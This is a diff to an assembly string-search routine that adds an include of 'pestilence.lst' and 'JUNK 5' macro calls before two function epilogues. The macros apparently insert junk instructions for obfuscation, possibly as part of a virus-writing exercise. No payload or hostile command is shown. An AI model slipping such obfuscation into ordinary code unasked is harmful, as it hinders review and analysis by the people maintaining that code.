@@ -1,4 +1,5 @@
 %define FT_STRSTR_S
+%include "pestilence.lst"
 
 section .text
 	global	_ft_strstr
@@ -34,6 +35,7 @@ _ft_strxequ_error:
 	mov		rax, 0
 
 _ft_strxequ_end:
+	JUNK 5
 	pop		rsi
 	pop		rdi
 	leave
@@ -62,6 +64,7 @@ _ft_strstr_loop:
 	jmp		_ft_strstr_loop
 
 _ft_strstr_end:
+	JUNK 5
 	mov rax, QWORD [rsp]
 	pop		rsi
 	pop		rdi
